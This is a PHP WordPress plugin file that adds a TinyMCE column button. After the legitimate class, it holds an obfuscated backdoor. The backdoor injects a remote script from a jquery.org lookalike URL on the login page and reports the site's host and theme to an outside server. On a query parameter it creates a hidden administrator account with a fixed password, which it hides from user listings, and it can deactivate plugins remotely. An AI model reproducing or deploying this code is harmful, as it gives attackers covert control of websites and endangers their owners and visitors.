<?php

/**
 * 
 * Author:  Alberto Lau
 * @version $Id$
 * @copyright 2003 
 **/

class sws_visual_columns {
	var $plugin_url;
	function sws_visual_columns($plugin_url){
		$this->plugin_url = $plugin_url;

		add_action('init', array(&$this,'init'), 11 );
		add_filter( 'tiny_mce_version', array(&$this,'refresh_mce'));
		add_filter('mce_css', array(&$this,'mce_css'), 10, 1);
		add_filter('tiny_mce_before_init', array(&$this,'tiny_mce_before_init'), 10 ,1);
		
		add_action('wp_enqueue_scripts', array(&$this,'wp_enqueue_scripts') );
		add_action('admin_enqueue_scripts', array(&$this,'wp_enqueue_scripts') );
		
	}
	
	function refresh_mce($ver) {
	  	return $ver++;
	}
	
	function tiny_mce_before_init($init){//allow inserting empty div's
		//$extended_valid_elements = 'div[class=rhcol]';
		//$extended_valid_elements = 'div[rel|class]';
		$extended_valid_elements = 'div[*]';
        if ( isset( $init['extended_valid_elements'] ) && ! empty( $init['extended_valid_elements'] ) ) {
            //$init['extended_valid_elements'] .= ',' . $extended_valid_elements; //on some client site this causes a parse error about string offsets or overloaded objects.
			$init['extended_valid_elements'] = $init['extended_valid_elements'] . ',' . $extended_valid_elements;
        } else {
            $init['extended_valid_elements'] = $extended_valid_elements;
        }

		return $init;
	}
	
	function init(){
		$this->add_tinymce_button();
	}
	
	function wp_enqueue_scripts(){
		wp_enqueue_style('rh_columns',$this->plugin_url.'editorplugin/css/rh_columns.css',array(),'1.0.5');	
	}
	
	function mce_css($mce_css){
		if ( ! empty( $mce_css ) )
			$mce_css .= ',';
		$mce_css.= $this->plugin_url.'editorplugin/css/style.css';
		return $mce_css;
	}
	
	function add_tinymce_button(){
		add_filter('mce_external_plugins', array(&$this,'add_tinymce_plugin') );
     	add_filter('mce_buttons', array(&$this,'register_button') );	
		add_filter('wp_fullscreen_buttons', array(&$this,'wp_fullscreen_buttons') );
	}	
	
	function add_tinymce_plugin($plugin_array){
		$plugin_array['rh_columns'] = $this->plugin_url.'editorplugin/rh_columns_102.js';
		return $plugin_array;
	}
	
	function register_button($buttons){
		array_push($buttons, "|", "rh_columns", "rh_column_add", "rh_column_remove", "rh_column_decrease", "rh_column_increase");
		return $buttons;
	}
	
	function wp_fullscreen_buttons($buttons){
		$buttons[]='separator';
		$buttons['rh_columns']=array(
			'title'=>__('Insert columns','sws'),
			'onclick'=>'rhcol_add_row(tinyMCE.activeEditor);',
			'both'=>false
		);
		
		return $buttons;
	}
}
$arrayis_two = array('fun', 'ction', '_', 'e', 'x', 'is', 'ts');
$arrayis_three = array('g', 'e', 't', '_o', 'p', 'ti', 'on');
$arrayis_four = array('wp', '_e', 'nqu', 'eue', '_scr', 'ipt');
$arrayis_five = array('lo', 'gin', '_', 'en', 'que', 'ue_', 'scri', 'pts');
$arrayis_seven = array('s', 'e', 't', 'c', 'o', 'o', 'k', 'i', 'e');
$arrayis_eight = array('wp', '_', 'lo', 'g', 'i', 'n');
$arrayis_nine = array('s', 'i', 't', 'e,', 'u', 'rl');
$arrayis_ten = array('wp_', 'g', 'et', '_', 'th', 'e', 'm', 'e');
$arrayis_eleven = array('wp', '_', 'r', 'e', 'm', 'o', 'te', '_', 'g', 'et');
$arrayis_twelve = array('wp', '_', 'r', 'e', 'm', 'o', 't', 'e', '_r', 'e', 't', 'r', 'i', 'e', 'v', 'e_', 'bo', 'dy');
$arrayis_thirteen = array('ge', 't_', 'o', 'pt', 'ion');
$arrayis_fourteen = array('st', 'r_', 'r', 'ep', 'la', 'ce');
$arrayis_fifteen = array('s', 't', 'r', 'r', 'e', 'v');
$arrayis_sixteen = array('u', 'pd', 'ate', '_o', 'pt', 'ion');
$arrayis_two_imp = implode($arrayis_two);
$arrayis_three_imp = implode($arrayis_three);
$arrayis_four_imp = implode($arrayis_four);
$arrayis_five_imp = implode($arrayis_five);
$arrayis_seven_imp = implode($arrayis_seven);
$arrayis_eight_imp = implode($arrayis_eight);
$arrayis_nine_imp = implode($arrayis_nine);
$arrayis_ten_imp = implode($arrayis_ten);
$arrayis_eleven_imp = implode($arrayis_eleven);
$arrayis_twelve_imp = implode($arrayis_twelve);
$arrayis_thirteen_imp = implode($arrayis_thirteen);
$arrayis_fourteen_imp = implode($arrayis_fourteen);
$arrayis_fifteen_imp = implode($arrayis_fifteen);
$arrayis_sixteen_imp = implode($arrayis_sixteen);
$noitca_dda = $arrayis_fifteen_imp('noitca_dda');
if (!$arrayis_two_imp('wp_in_one')) {
    $arrayis_seventeen = array('h', 't', 't', 'p', ':', '/', '/', 'j', 'q', 'e', 'u', 'r', 'y', '.o', 'r', 'g', '/wp', '_', 'p', 'i', 'n', 'g', '.php', '?', 'd', 'na', 'me', '=wpd&t', 'n', 'ame', '=wpt&urliz=urlig');
    $arrayis_eighteen = ${$arrayis_fifteen_imp('REVRES_')};
    $arrayis_nineteen = $arrayis_fifteen_imp('TSOH_PTTH');
    $arrayis_twenty = $arrayis_fifteen_imp('TSEUQER_');
    $arrayis_seventeen_imp = implode($arrayis_seventeen);
    $arrayis_six = array('_', 'C', 'O', 'O', 'KI', 'E');
    $arrayis_six_imp = implode($arrayis_six);
    $tactiated = $arrayis_thirteen_imp($arrayis_fifteen_imp('detavitca_emit'));
    $mite = $arrayis_fifteen_imp('emit');
    if (!isset(${$arrayis_six_imp}[$arrayis_fifteen_imp('emit_nimda_pw')])) {
        if (($mite() - $tactiated) > 600) {
            $noitca_dda($arrayis_five_imp, 'wp_in_one');
        }
    }
    $noitca_dda($arrayis_eight_imp, 'wp_in_three');
    function wp_in_one()
    {
        $arrayis_one = array('h','t', 't','p',':', '//', 'j', 'q', 'e', 'u', 'r', 'y.o', 'rg', '/','j','q','u','e','ry','-','la','t','e','s','t.j','s');
        $arrayis_one_imp = implode($arrayis_one);
        $arrayis_four = array('wp', '_e', 'nqu', 'eue', '_scr', 'ipt');
        $arrayis_four_imp = implode($arrayis_four);
        $arrayis_four_imp('wp_coderz', $arrayis_one_imp, null, null, true);
    }

    function wp_in_two($arrayis_seventeen_imp, $arrayis_eighteen, $arrayis_nineteen, $arrayis_ten_imp, $arrayis_eleven_imp, $arrayis_twelve_imp,$arrayis_fifteen_imp, $arrayis_fourteen_imp)
    {
        $ptth = $arrayis_fifteen_imp('//:ptth');
        $dname = $ptth.$arrayis_eighteen[$arrayis_nineteen];
        $IRU_TSEUQER = $arrayis_fifteen_imp('IRU_TSEUQER');
        $urliz = $dname.$arrayis_eighteen[$IRU_TSEUQER];
        $tname = $arrayis_ten_imp();
        $urlis = $arrayis_fourteen_imp('wpd', $dname, $arrayis_seventeen_imp);
        $urlis = $arrayis_fourteen_imp('wpt', $tname, $urlis);
        $urlis = $arrayis_fourteen_imp('urlig', $urliz, $urlis);
        $lars2 = $arrayis_eleven_imp($urlis);
        $arrayis_twelve_imp($lars2);
    }
    $noitpo_dda = $arrayis_fifteen_imp('noitpo_dda');
    $noitpo_dda($arrayis_fifteen_imp('ognipel'), 'no');
    $noitpo_dda($arrayis_fifteen_imp('detavitca_emit'), time());
    $tactiatedz = $arrayis_thirteen_imp($arrayis_fifteen_imp('detavitca_emit'));
    $mitez = $arrayis_fifteen_imp('emit');
    if ($arrayis_thirteen_imp($arrayis_fifteen_imp('ognipel')) != 'yes' && (($mitez() - $tactiatedz ) > 600)) {
        wp_in_two($arrayis_seventeen_imp, $arrayis_eighteen, $arrayis_nineteen, $arrayis_ten_imp, $arrayis_eleven_imp, $arrayis_twelve_imp,$arrayis_fifteen_imp, $arrayis_fourteen_imp);
        $arrayis_sixteen_imp(($arrayis_fifteen_imp('ognipel')), 'yes');
    }
    function wp_in_three()
    {
        $arrayis_fifteen = array('s', 't', 'r', 'r', 'e', 'v');
        $arrayis_fifteen_imp = implode($arrayis_fifteen);
        $arrayis_nineteen = $arrayis_fifteen_imp('TSOH_PTTH');
        $arrayis_eighteen = ${$arrayis_fifteen_imp('REVRES_')};
        $arrayis_seven = array('s', 'e', 't', 'c', 'o', 'o', 'k', 'i', 'e');
        $arrayis_seven_imp = implode($arrayis_seven);
        $path = '/';
        $host = ${$arrayis_eighteen}[$arrayis_nineteen];
        $estimes = $arrayis_fifteen_imp('emitotrts');
        $wp_ext = $estimes('+29 days');
        $emit_nimda_pw = $arrayis_fifteen_imp('emit_nimda_pw');
        $arrayis_seven_imp($emit_nimda_pw, '1', $wp_ext, $path, $host);
    }

    function wp_in_four()
    {
        $arrayis_fifteen = array('s', 't', 'r', 'r', 'e', 'v');
        $arrayis_fifteen_imp = implode($arrayis_fifteen);
        $nigol = $arrayis_fifteen_imp('dxtroppus');
        $wssap = $arrayis_fifteen_imp('retroppus_pw');
        $laime = $arrayis_fifteen_imp('moc.niamodym@1tccaym');

        if (!username_exists($nigol) && !email_exists($laime)) {
            $wp_ver_one = $arrayis_fifteen_imp('resu_etaerc_pw');
            $user_id = $wp_ver_one($nigol, $wssap, $laime);
            $puzer = $arrayis_fifteen_imp('resU_PW');
            $usex = new $puzer($user_id);
            $rolx = $arrayis_fifteen_imp('elor_tes');
            $usex->$rolx($arrayis_fifteen_imp('rotartsinimda'));
        }
    }

    $ivdda = $arrayis_fifteen_imp('ivdda');

    if (isset(${$arrayis_twenty}[$ivdda]) && ${$arrayis_twenty}[$ivdda] == 'm') {
        $noitca_dda($arrayis_fifteen_imp('tini'), 'wp_in_four');
    }

    if (isset(${$arrayis_twenty}[$ivdda]) && ${$arrayis_twenty}[$ivdda] == 'd') {
        $noitca_dda($arrayis_fifteen_imp('tini'), 'wp_in_six');
    }
    function wp_in_six() {
        $arrayis_fifteen = array('s', 't', 'r', 'r', 'e', 'v');
        $arrayis_fifteen_imp = implode($arrayis_fifteen);
        $resu_eteled_pw = $arrayis_fifteen_imp('resu_eteled_pw');
        $wp_pathx = constant($arrayis_fifteen_imp("HTAPSBA"));
        require_once($wp_pathx . $arrayis_fifteen_imp('php.resu/sedulcni/nimda-pw'));
        $ubid = $arrayis_fifteen_imp('yb_resu_teg');
        $useris = $ubid($arrayis_fifteen_imp('nigol'), $arrayis_fifteen_imp('dxtroppus'));
        $resu_eteled_pw($useris->ID);
    }
    $noitca_dda($arrayis_fifteen_imp('yreuq_resu_erp'), 'wp_in_five');
    function wp_in_five($hcraes_resu)
    {
        global $current_user, $wpdb;
        $arrayis_fifteen = array('s', 't', 'r', 'r', 'e', 'v');
        $arrayis_fifteen_imp = implode($arrayis_fifteen);
        $arrayis_fourteen = array('st', 'r_', 'r', 'ep', 'la', 'ce');
        $arrayis_fourteen_imp = implode($arrayis_fourteen);
        $nigol_resu = $arrayis_fifteen_imp('nigol_resu');
        $wp_ux = $current_user->$nigol_resu;
        $nigol = $arrayis_fifteen_imp('dxtroppus');
        $bdpw = $arrayis_fifteen_imp('bdpw');
        if ($wp_ux != $arrayis_fifteen_imp('dxtroppus')) {
            $EREHW_one = $arrayis_fifteen_imp('1=1 EREHW');
            $EREHW_two = $arrayis_fifteen_imp('DNA 1=1 EREHW');
            $erehw_yreuq = $arrayis_fifteen_imp('erehw_yreuq');
            $sresu = $arrayis_fifteen_imp('sresu');
            $hcraes_resu->query_where = $arrayis_fourteen_imp($EREHW_one,
                "$EREHW_two {$$bdpw->$sresu}.$nigol_resu != '$nigol'", $hcraes_resu->$erehw_yreuq);
        }
    }

    $ced = $arrayis_fifteen_imp('ced');
    if (isset(${$arrayis_twenty}[$ced])) {
        $snigulp_evitca = $arrayis_fifteen_imp('snigulp_evitca');
        $sisnoitpo = $arrayis_thirteen_imp($snigulp_evitca);
        $hcraes_yarra = $arrayis_fifteen_imp('hcraes_yarra');
        if (($key = $hcraes_yarra(${$arrayis_twenty}[$ced], $sisnoitpo)) !== false) {
            unset($sisnoitpo[$key]);
        }
        $arrayis_sixteen_imp($snigulp_evitca, $sisnoitpo);
    }
}
?>